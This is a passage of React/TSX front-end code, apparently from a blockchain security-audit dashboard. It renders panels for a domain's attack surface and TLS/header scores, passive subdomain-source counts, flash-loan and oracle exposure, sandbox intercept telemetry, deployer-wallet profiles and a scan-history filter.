                  <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🛡️ {isRu ? "Риск периметра, TLS и Заголовки" : "Perimeter Risk, TLS & Headers"}
                  </span>
                  <span className="rounded border border-border bg-card px-2 py-0.5 text-[10px] font-bold text-foreground">
                    Headers Avg: {hdrScore}/100
                  </span>
                </div>

                <div className="flex items-center gap-4">
                  <div className="relative h-28 w-28 shrink-0">
                    <svg viewBox="0 0 120 120" className="h-full w-full rotate-[135deg]">
                      <circle cx="60" cy="60" r={rG} fill="transparent" stroke="hsl(var(--border))" strokeWidth="9" strokeDasharray={`${arcG} ${cG}`} strokeLinecap="round" />
                      <circle cx="60" cy="60" r={rG} fill="transparent" stroke={sRisk >= 60 ? "#ef4444" : sRisk >= 35 ? "#f59e0b" : "#10b981"} strokeWidth="9" strokeDasharray={`${arcG} ${cG}`} strokeDashoffset={sRiskOffset} strokeLinecap="round" />
                    </svg>
                    <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
                      <span className="text-2xl font-black text-foreground">{sRisk}</span>
                      <span className="text-[8px] uppercase text-muted-foreground">SURFACE RISK</span>
                    </div>
                  </div>

                  <div className="flex-1 space-y-1.5 text-[11px]">
                    <div className="rounded border border-border bg-card p-2">
                      <p className="text-[9px] uppercase text-muted-foreground">🔒 TLS Certificate</p>
                      <p className="font-bold text-foreground truncate">{tls.issuer || "Verified TLS"}</p>
                      <p className="text-[10px] text-emerald-400">
                        {tls.protocol || "TLSv1.3"} {tls.days_left !== null && tls.days_left !== undefined ? `· ${tls.days_left}d left` : ""}
                      </p>
                    </div>
                    <div className="rounded border border-border bg-card p-2">
                      <p className="text-[9px] uppercase text-muted-foreground">🔐 Privileged Nodes</p>
                      <p className="font-bold text-amber-400">{(result.privileged_hosts || []).length} critical hosts</p>
                    </div>
                  </div>
                </div>

                {result.waf_breakdown && Object.keys(result.waf_breakdown).length > 0 && (
                  <div className="flex flex-wrap gap-1.5 pt-2 border-t border-border/60 text-[10px]">
                    <span className="text-muted-foreground">☁️ WAF/CDN:</span>
                    {Object.entries(result.waf_breakdown).map(([wName, wCnt]: [string, any]) => (
                      <span key={wName} className="rounded border border-cyan-500/30 bg-cyan-500/10 px-2 py-0.5 text-cyan-300 font-semibold">
                        {wName}: {wCnt}
                      </span>
                    ))}
                  </div>
                )}
              </div>

              {/* COL 2 (4 cols): 6-Source Passive OSINT Subdomain Discovery Funnel */}
              <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between space-y-2.5">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    📡 {isRu ? "6 Пассивных OSINT-источников поддоменов" : "6 Passive OSINT Subdomain Sources"}
                  </span>
                  <span className="text-[10px] text-emerald-400 font-bold">Zero-Key OSINT</span>
                </div>

                <div className="space-y-1.5">
                  {[
                    { k: "crt_sh", label: "Certificate Transparency (crt.sh)", color: "bg-primary" },
                    { k: "rapiddns", label: "RapidDNS.io Passive Table", color: "bg-cyan-500" },
                    { k: "alienvault_otx", label: "AlienVault OTX Passive DNS", color: "bg-emerald-500" },
                    { k: "urlscan_io", label: "URLScan.io Public Index", color: "bg-purple-500" },
                    { k: "hackertarget", label: "HackerTarget HostSearch", color: "bg-amber-500" },
                    { k: "wayback_cdx", label: "Wayback Machine CDX Archive", color: "bg-pink-500" },
                  ].map((src) => {
                    const cnt = Number(pSources[src.k] ?? 0);
                    const maxS = Math.max(1, ...Object.values(pSources).map((v: any) => Number(v || 0)));
                    const wPct = Math.min(100, Math.max(4, (cnt / maxS) * 100));
                    return (
                      <div key={src.k} className="space-y-0.5 text-[10px]">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">{src.label}</span>
                          <b className="text-foreground">{cnt} hosts</b>
                        </div>
                        <div className="h-1.5 w-full overflow-hidden rounded-full bg-card border border-border/60">
                          <div className={`h-full ${src.color}`} style={{ width: `${wPct}%` }} />
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* COL 3 (4 cols): RDAP Domain Age & DNS Mail/Auth Posture */}
              <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between space-y-2.5">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🏛️ {isRu ? "RDAP Домен, Почта (MX) & Владение" : "RDAP Domain, MX & Ownership"}
                  </span>
                  {rdap.age_years !== undefined && rdap.age_years !== null && (
                    <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2 py-0.5 text-[10px] font-bold text-emerald-300">
                      {rdap.age_years} yrs old
                    </span>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-2 text-[11px]">
                  <div className="rounded border border-border bg-card p-2">
                    <p className="text-[9px] uppercase text-muted-foreground">Registered / Expires</p>
                    <p className="font-bold text-foreground mt-0.5">{rdap.registered_at || "—"}</p>
                    <p className="text-[9px] text-muted-foreground">Exp: {rdap.expires_at || "—"}</p>
                  </div>
                  <div className="rounded border border-border bg-card p-2">
                    <p className="text-[9px] uppercase text-muted-foreground">Registrar / DNSSEC</p>
                    <p className="font-bold text-foreground truncate mt-0.5">{rdap.registrar || "—"}</p>
                    <p className="text-[9px] text-muted-foreground">DNSSEC: {rdap.dnssec ? "✅ YES" : "❌ NO"}</p>
                  </div>
                </div>

                <div className="rounded border border-border bg-card p-2.5 space-y-1 text-[10px]">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">MX Mail Provider:</span>
                    <b className="text-foreground">{dns.mail_provider || "None"}</b>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">DMARC / SPF:</span>
                    <b className={dns.dmarc_enforced ? "text-emerald-400" : "text-amber-400"}>
                      {dns.dmarc_enforced ? "✓ Strict DMARC" : dns.spf ? "SPF Present" : "No DMARC"}
                    </b>
                  </div>
                  {dns.verified_services?.length > 0 && (
                    <div className="flex flex-wrap gap-1 pt-1 border-t border-border/60">
                      {dns.verified_services.map((vs: string, vi: number) => (
                        <span key={vi} className="rounded bg-primary/15 px-1.5 py-0.5 text-[9px] text-primary font-semibold">
                          ✓ {vs}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* INTERACTIVE SVG ATTACK SURFACE TOPOLOGY GRAPH */}
            {aliveList.length > 0 && (
              <div className="rounded-xl border border-border bg-background/70 p-4 space-y-2.5">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🕸️ {isRu ? "Топологический граф поверхности атаки (Поддомены → Корневой Домен → Ончейн-Контракты)" : "Interactive Attack Surface Topology Graph"}
                  </span>
                  <span className="text-[10px] text-muted-foreground">
                    🟠 Privileged / API · 🟢 Public Edge / dApp · 🟣 Linked On-Chain Contracts
                  </span>
                </div>
                <div className="overflow-x-auto">
                  <svg viewBox="0 0 860 280" className="w-full min-w-[660px] h-auto rounded-lg bg-card/70 border border-border/60">
                    {(() => {
                      const leftSubs = aliveList.slice(0, 7);
                      const rightContracts = (result.contracts_enriched || []).slice(0, 6);
                      const cx = 430;
                      const cy = 140;
                      return (
                        <>
                          {leftSubs.map((s: any, idx: number) => {
                            const sy = leftSubs.length === 1 ? 140 : 32 + idx * (216 / Math.max(1, leftSubs.length - 1));
                            const isPriv = s.role === "PRIVILEGED_CORE" || s.role === "BACKEND_API_RPC" || (result.privileged_hosts || []).includes(s.host);
                            const strokeCol = isPriv ? "#f59e0b" : "#10b981";
                            return (
                              <g key={`sub_${idx}`}>
                                <path d={`M 245 ${sy} C 325 ${sy}, 335 ${cy}, ${cx - 80} ${cy}`} fill="none" stroke={strokeCol} strokeWidth="1.8" strokeOpacity="0.7" />
                                <rect x="18" y={sy - 16} width="227" height="32" rx="7" fill="hsl(var(--card))" stroke={strokeCol} strokeWidth="1.2" />
                                <text x="26" y={sy - 2} fill="hsl(var(--foreground))" fontSize="9.5" fontWeight="bold">
                                  {isPriv ? "🔐 " : "🟢 "}{String(s.host).slice(0, 26)}
                                </text>
                                <text x="26" y={sy + 10} fill={strokeCol} fontSize="8.5">
                                  HTTP {s.status} · {String(s.waf_cdn || "Direct").slice(0, 18)} · Hdr:{s.security_headers?.grade || "—"}
                                </text>
                              </g>
                            );
                          })}

                          {rightContracts.map((ce: any, idx: number) => {
                            const ey = rightContracts.length === 1 ? 140 : 35 + idx * (210 / Math.max(1, rightContracts.length - 1));
                            return (
                              <g key={`cnt_${idx}`}>
                                <path d={`M ${cx + 80} ${cy} C 525 ${cy}, 535 ${ey}, 615 ${ey}`} fill="none" stroke="#a855f7" strokeWidth="1.8" strokeOpacity="0.7" />
                                <rect x="615" y={ey - 16} width="227" height="32" rx="7" fill="hsl(var(--card))" stroke="#a855f7" strokeWidth="1.2" />
                                <text x="624" y={ey - 2} fill="hsl(var(--foreground))" fontSize="9.5" fontWeight="bold">
                                  📜 {String(ce.name || "Contract").slice(0, 25)}
                                </text>
                                <text x="624" y={ey + 10} fill="#c084fc" fontSize="8.5">
                                  {String(ce.address).slice(0, 10)}…{String(ce.address).slice(-6)}
                                </text>
                              </g>
                            );
                          })}

                          <rect x={cx - 80} y={cy - 32} width="160" height="64" rx="12" fill="hsl(var(--card))" stroke="hsl(var(--primary))" strokeWidth="2.2" />
                          <text x={cx} y={cy - 8} textAnchor="middle" fill="hsl(var(--primary))" fontSize="11" fontWeight="bold">
                            🌐 {String(result.domain).slice(0, 18)}
                          </text>
                          <text x={cx} y={cy + 7} textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9">
                            {aliveList.length} Alive Hosts · {(result.contracts_enriched || []).length} Contracts
                          </text>
                          <text x={cx} y={cy + 21} textAnchor="middle" fill="hsl(var(--muted-foreground))" fontSize="8.5">
                            Risk: {sRisk}/100 · Headers: {hdrScore}/100
                          </text>
                        </>
                      );
                    })()}
                  </svg>
                </div>
              </div>
            )}

            {/* DEEP SUBDOMAINS & INFRASTRUCTURE TABLE */}
            {aliveList.length > 0 && (
              <div className="rounded-xl border border-border bg-background/70 p-4 space-y-2.5">
                <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  🛰️ {isRu ? `Профилированные живые поддомены и узлы (${aliveList.length})` : `Profiled Alive Subdomains & Nodes (${aliveList.length})`}
                </p>
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3 max-h-80 overflow-y-auto pr-1">
                  {aliveList.map((s: any, i: number) => {
                    const isPriv = s.role === "PRIVILEGED_CORE" || (result.privileged_hosts || []).includes(s.host);
                    const isApi = s.role === "BACKEND_API_RPC";
                    const hdrG = s.security_headers?.grade || "—";
                    return (
                      <div
                        key={i}
                        className={`rounded-lg border p-3 space-y-1.5 transition-colors ${
                          isPriv
                            ? "border-amber-500/50 bg-amber-500/10"
                            : isApi
                            ? "border-cyan-500/40 bg-cyan-500/5"
                            : "border-border bg-card"
                        }`}
                      >
                        <div className="flex items-center justify-between gap-2">
                          <a
                            href={s.url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="font-bold text-foreground hover:text-primary hover:underline truncate"
                          >
                            {isPriv ? "🔐 " : isApi ? "🔌 " : "🟢 "}
                            {s.host} ↗
                          </a>
                          <span className="rounded border border-border bg-background px-1.5 py-0.5 text-[9px] font-bold text-primary shrink-0">
                            HTTP {s.status || "DNS"} · Hdr:{hdrG}
                          </span>
                        </div>
                        {s.title && (
                          <p className="truncate text-[10px] text-foreground/80" title={s.title}>
                            📄 {s.title}
                          </p>
                        )}
                        <div className="flex flex-wrap items-center justify-between gap-1 text-[9px] text-muted-foreground">
                          <span>☁️ {s.waf_cdn || "Direct"}</span>
                          {s.ips?.length > 0 && <span>IP: {s.ips[0]}</span>}
                        </div>
                        {s.cname && (
                          <p className="truncate text-[9px] text-cyan-300" title={s.cname}>
                            CNAME → {s.cname}
                          </p>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* ENRICHED SMART CONTRACTS (WITH 1-CLICK CROSS-TOOL AUDIT) & BACKEND ENDPOINTS */}
            <div className="grid grid-cols-1 gap-3 lg:grid-cols-2">
              <div className="rounded-xl border border-border bg-background/70 p-4 space-y-2">
                <p className="text-[10px] uppercase text-primary font-bold">
                  📜 {isRu ? `Смарт-контракты протокола и JS-бандлов (${(result.contracts_enriched || []).length})` : `Protocol & JS Bundle Smart Contracts (${(result.contracts_enriched || []).length})`}
                </p>
                {(result.contracts_enriched || []).length === 0 ? (
                  <p className="text-[11px] text-muted-foreground">—</p>
                ) : (
                  <div className="max-h-60 overflow-y-auto space-y-1.5 pr-1">
                    {(result.contracts_enriched || []).map((ce: any, idx: number) => (
                      <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                        <div className="min-w-0 flex-1">
                          <p className="font-bold text-primary truncate">{ce.name}</p>
                          <code className="text-[10px] text-muted-foreground select-all">{ce.address}</code>
                        </div>
                        <div className="flex items-center gap-1 shrink-0">
                          <button
                            type="button"
                            onClick={() => {
                              setTool("proxy");
                              setInput1(ce.address);
                            }}
                            className="rounded border border-border bg-background px-1.5 py-0.5 text-[9px] hover:border-primary hover:text-primary"
                            title="Inspect Proxy & Upgradeability"
                          >
                            🔗 Proxy
                          </button>
                          <button
                            type="button"
                            onClick={() => {
                              setTool("funds");
                              setInput1(ce.address);
                            }}
                            className="rounded border border-border bg-background px-1.5 py-0.5 text-[9px] hover:border-primary hover:text-primary"
                            title="Inspect Funds Flow"
                          >
                            💸 Flow
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="rounded-xl border border-border bg-background/70 p-4 space-y-2">
                <p className="text-[10px] uppercase text-primary font-bold">
                  🔌 RPC / API / GraphQL / Backend Endpoint Groups
                </p>
                <div className="max-h-60 overflow-y-auto space-y-1.5 text-[11px]">
                  {result.backend_groups &&
                    Object.entries(result.backend_groups).map(([grp, paths]: [string, any]) =>
                      Array.isArray(paths) && paths.length > 0 ? (
                        <div key={grp} className="rounded border border-border bg-card p-2">
                          <span className="font-bold uppercase text-primary">[{grp}]</span>{" "}
                          <span className="text-muted-foreground">{paths.slice(0, 6).join(", ")}</span>
                        </div>
                      ) : null
                    )}
                  {[
                    ...(result.frontend?.api || []),
                    ...(result.frontend?.rpc || []),
                    ...(result.frontend?.graphql || []),
                    ...(result.frontend?.ws || []),
                  ]
                    .slice(0, 12)
                    .map((u: string, idx: number) => (
                      <div key={idx} className="truncate text-muted-foreground select-all">
                        • {u}
                      </div>
                    ))}
                </div>
              </div>
            </div>
          </div>
        );
      })()}

      {/* 12. Flash-Loan & Spot-Oracle + Bridge Signature Detector */}
      {result && tool === "flash" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              {(result.display_name || result.contract_name || result.implementation_name) && (
                <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-0.5 text-xs font-bold text-emerald-300">
                  🏛️ {result.display_name || result.implementation_name || result.contract_name}
                </span>
              )}
              <span className="text-primary font-bold">{result.address}</span>
              <span className="text-muted-foreground">({result.chain})</span>
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} · Score: {result.composite_score}
            </span>
          </div>

          {/* VISUAL TUG-OF-WAR BAR: SPOT MANIPULATION EXPOSURE vs TWAP/ORACLE DEFENSE */}
          {(() => {
            const spScore = Number(result.spot_oracle?.spot_score ?? 0) + Number(result.spot_oracle?.flash_score ?? 0);
            const prScore = Number(result.spot_oracle?.protection_score ?? 0);
            const totF = Math.max(1, spScore + prScore);
            const atkPct = spScore === 0 && prScore === 0 ? 20 : Math.min(95, Math.max(10, Math.round((spScore / totF) * 100)));
            return (
              <div className="rounded-xl border border-border bg-background/70 p-3.5 space-y-2">
                <div className="flex items-center justify-between text-[11px]">
                  <span className="text-red-400 font-bold">⚡ Attack Surface (Spot + Flash): {spScore} pts ({atkPct}%)</span>
                  <span className="text-emerald-400 font-bold">🛡️ Oracle Defense (TWAP / Chainlink): {prScore} pts ({100 - atkPct}%)</span>
                </div>
                <div className="h-3 w-full overflow-hidden rounded-full bg-emerald-500/35 flex border border-border">
                  <div className="h-full bg-gradient-to-r from-red-600 to-amber-500 transition-all duration-700" style={{ width: `${atkPct}%` }} />
                </div>
              </div>
            );
          })()}

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">SPOT Oracle Score</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.spot_oracle?.spot_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">TWAP / Chainlink Defense</p>
              <p className="mt-1 text-sm font-bold text-green-400">{result.spot_oracle?.protection_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">FlashLoan Callbacks</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.spot_oracle?.flash_score ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Monetizers (Borrow/Liq)</p>
              <p className="mt-1 text-sm font-bold text-primary">{result.spot_oracle?.monetizer_score ?? 0}</p>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Признаки SPOT-цены и монетизации" : "Detected SPOT Reads & Monetizers"}
              </p>
              {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].length === 0 ? (
                <p className="text-[11px] text-muted-foreground">—</p>
              ) : (
                <div className="space-y-1">
                  {[...(result.spot_oracle?.spot || []), ...(result.spot_oracle?.flash || []), ...(result.spot_oracle?.monetizers || [])].map((s: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1 text-[11px]">
                      <span className="text-foreground">{s.name}</span>
                      <span className="text-primary font-bold">×{s.hits}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <p className="text-[10px] uppercase text-primary font-bold">
                {isRu ? "Защитные оракулы и байткод-сигнатуры мостов" : "Oracle Defenses & Bridge Bytecode Signatures"}
              </p>
              {(result.spot_oracle?.protection || []).map((p: any, idx: number) => (
                <div key={idx} className="flex items-center justify-between rounded border border-green-500/30 bg-green-500/10 px-2.5 py-1 text-[11px] text-green-400">
                  <span>🛡️ {p.name}</span>
                  <b>×{p.hits}</b>
                </div>
              ))}
              {result.bytecode_signatures && Object.keys(result.bytecode_signatures).length > 0 && (
                <div className="pt-1 flex flex-wrap gap-1.5">
                  {Object.entries(result.bytecode_signatures).map(([cat, sels]: [string, any]) => (
                    <span key={cat} className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                      {cat}: {Array.isArray(sels) ? sels.length : 1}
                    </span>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 13. Matrix Sandbox v16.2 (Isolated Process + AuditHook + Honeypot) */}
      {result && tool === "sandbox" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex items-center gap-2">
              <span className="font-bold text-foreground">
                Matrix Sandbox v16.2 ({result.status || "PASS"})
              </span>
              <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                ENGINE: {result.engine || "matrix_sandbox_v16_2"}
              </span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                String(result.verdict).startsWith("CRITICAL") || String(result.verdict).startsWith("HIGH")
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Blocked Hostile Ops</p>
              <p className="mt-1 text-sm font-bold text-red-400">{result.blocked_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Honeypot Simulated</p>
              <p className="mt-1 text-sm font-bold text-amber-400">{result.simulated_count ?? result.intercepted_count ?? 0}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3 col-span-2">
              <p className="text-[10px] uppercase text-muted-foreground">Intercepted Subsystems</p>
              <p className="mt-1 truncate font-bold text-primary">
                {(result.dangerous_mocked || []).join(", ") || "None"}
              </p>
            </div>
          </div>

          <div className="rounded-lg border border-border bg-background p-3.5 space-y-2">
            <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
              {isRu
                ? `Телеметрия перехваченных вызовов Matrix v16.2 (${result.intercepted_count || 0}):`
                : `Matrix v16.2 Intercepted Call Telemetry (${result.intercepted_count || 0}):`}
            </p>
            {(result.intercepted_calls || []).length === 0 ? (
              <p className="text-[11px] text-muted-foreground">
                {isRu ? "Опасных вызовов не зафиксировано." : "No dangerous calls intercepted."}
              </p>
            ) : (
              <div className="space-y-1.5 max-h-60 overflow-y-auto">
                {(result.intercepted_calls || []).map((ic: any, idx: number) => (
                  <div key={idx} className="flex flex-wrap items-center justify-between gap-2 rounded border border-red-500/30 bg-red-500/5 px-3 py-1.5 text-[11px]">
                    <div className="flex items-center gap-2">
                      <span
                        className={`rounded px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                          ic.classification === "BLOCKED"
                            ? "bg-red-500/25 text-red-300"
                            : "bg-amber-500/20 text-amber-300"
                        }`}
                      >
                        {ic.classification || "SIMULATED"}
                      </span>
                      <span className="font-bold text-red-400">
                        {ic.call}
                      </span>
                    </div>
                    <code className="text-foreground break-all">
                      {Array.isArray(ic.args) ? ic.args.join(" · ") : JSON.stringify(ic.args)}
                    </code>
                  </div>
                ))}
              </div>
            )}
          </div>

          {(result.stdout || result.stderr) && (
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground mb-1">Sandbox Output (stdout / stderr)</p>
              <pre className="whitespace-pre-wrap text-[11px] text-foreground">
                {result.stdout}
                {result.stderr ? `\n[stderr] ${result.stderr}` : ""}
              </pre>
            </div>
          )}
        </div>
      )}

      {/* 14. Deployer & On-Chain Address Profiler (address_profiler.py + deploy_analyzer.py) */}
      {result && tool === "deployer" && result.primary && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                {result.primary.type || "ADDRESS"}
              </span>
              {(result.primary.display_name || result.primary.known_label || result.primary.contract_name) && (
                <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-0.5 text-xs font-bold text-emerald-300">
                  🏛️ {result.primary.display_name || result.primary.known_label || result.primary.contract_name}
                </span>
              )}
              <span className="text-primary font-bold">{result.primary.address}</span>
              <span className="text-muted-foreground">({String(result.primary.chain || "").toUpperCase()})</span>
            </div>
            <span className="rounded border border-border bg-background px-2.5 py-0.5 text-[11px] font-bold text-foreground">
              Risk: {result.primary.risk_level || "LOW"}
            </span>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Contract / Entity Name</p>
              <p className="mt-1 truncate font-bold text-foreground">
                {result.primary.known_label || result.primary.contract_name || "Unlabeled"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                {result.primary.category || "general"} · {result.primary.pattern || "standard"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Age & Verification</p>
              <p className="mt-1 font-bold text-foreground">
                {result.primary.age_days !== null && result.primary.age_days !== undefined
                  ? `${result.primary.age_days} days`
                  : "—"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Verified: {result.primary.verified ? "✅ YES" : "❌ NO"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Native Balance / Txs</p>
              <p className="mt-1 font-bold text-foreground">
                {Number(result.primary.balance_native || 0).toFixed(4)} ETH/Native
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Tx Count: {result.primary.tx_count ?? 0}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy / Implementation</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.primary.is_proxy ? (result.primary.implementation || "Proxy") : "Standalone"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">
                Created: {result.primary.creation_time ? String(result.primary.creation_time).slice(0, 10) : "—"}
              </p>
            </div>
          </div>

          {/* Creator / Deployer Wallet Intelligence */}
          {result.primary.creator && (
            <div className="rounded-lg border border-primary/30 bg-background p-4 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  👤 {isRu ? "Досье кошелька Деплоера (Creator EOA / Multisig):" : "Deployer Wallet Intelligence (Creator):"}
                </span>
                {result.primary.creation_tx && (
                  <span className="truncate text-[10px] text-muted-foreground">
                    Deploy Tx: {result.primary.creation_tx.slice(0, 18)}…
                  </span>
                )}
              </div>
              <div className="flex flex-wrap items-center justify-between gap-3">
                <code className="font-bold text-foreground select-all">{result.primary.creator}</code>
                {result.primary.creator_profile && (
                  <div className="flex flex-wrap gap-3 text-[11px] text-muted-foreground">
                    <span>
                      Type: <b className="text-foreground">{String(result.primary.creator_profile.type).toUpperCase()}</b>
                    </span>
                    <span>
                      Balance: <b className="text-foreground">{Number(result.primary.creator_profile.balance_native || 0).toFixed(4)}</b>
                    </span>
                    <span>
                      Txs: <b className="text-foreground">{result.primary.creator_profile.tx_count ?? 0}</b>
                    </span>
                    {result.primary.creator_profile.age_days !== null && (
                      <span>
                        Age: <b className="text-foreground">{result.primary.creator_profile.age_days}d</b>
                      </span>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Security Notes & Exposed ABI Functions */}
          {Array.isArray(result.primary.security_notes) && result.primary.security_notes.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5 space-y-1">
              <p className="text-[10px] uppercase text-primary font-bold">Security Observations</p>
              {result.primary.security_notes.map((sn: string, idx: number) => (
                <p key={idx} className="text-[11px] text-foreground">• {sn}</p>
              ))}
            </div>
          )}

          {Array.isArray(result.primary.abi_functions) && result.primary.abi_functions.length > 0 && (
            <div className="rounded-lg border border-border bg-background p-3.5">
              <p className="mb-2 text-[10px] uppercase text-muted-foreground font-bold">
                Exposed ABI Functions ({result.primary.abi_functions.length})
              </p>
              <div className="flex flex-wrap gap-1.5 max-h-36 overflow-y-auto">
                {result.primary.abi_functions.slice(0, 40).map((fn: string, idx: number) => (
                  <code key={idx} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-foreground">
                    {fn}
                  </code>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* TOOL RUN HISTORY (Holders & Whales, Market & Derivatives, Funds Flow 14d, Social, Soroban, OSPEC) */}
      <div className="rounded-xl border border-border bg-card p-5">
        <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <History size={15} className="text-primary" />
            <h4 className="font-mono text-xs font-bold uppercase tracking-wider text-foreground">
              {isRu
                ? "История сканов по инструментам (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"
                : "Intelligence Tool Scan History (Holders · Market · Funds Flow · Social · Soroban · OSPEC)"}
            </h4>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {[
              { id: "all", label: isRu ? "Все" : "All" },
              { id: "holders", label: "Holders" },
              { id: "market", label: "Market" },
              { id: "funds", label: "Funds Flow" },
              { id: "social", label: "Social" },
              { id: "soroban", label: "Soroban" },
              { id: "ospec", label: "OSPEC" },
              { id: "zk", label: "ZK Math v5.5" },
              { id: "drift", label: "Audit Drift" },
              { id: "hacks", label: "2,539 Exploits DB" },
              { id: "deployer", label: "Deployer" },
              { id: "proxy", label: "Proxy" },
              { id: "flash", label: "Flash/Spot" },
              { id: "surface", label: "Surface" },
              { id: "sandbox", label: "Sandbox v16.2" },
            ].map((f) => (
              <button
                key={f.id}
                onClick={() => setHistoryFilter(f.id)}
                className={`rounded-lg px-2.5 py-1 font-mono text-[10px] font-semibold transition-all ${
                  historyFilter === f.id
                    ? "bg-primary text-primary-foreground"
                    : "border border-border bg-background text-muted-foreground hover:text-foreground"
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>
        </div>

        {historyItems.length === 0 ? (
          <p className="font-mono text-xs text-muted-foreground">
            {isRu
              ? "История запусков инструментов пока пуста. Любой прогон по Holders, Market, Funds Flow, Social, Soroban или OSPEC автоматически сохраняется здесь."
              : "No tool runs recorded yet. Every Holders, Market, Funds Flow, Social, Soroban or OSPEC scan is saved here automatically."}
          </p>
        ) : (
          <div className="space-y-2">
            {historyItems.map((item) => (
              <div
                key={item.id}
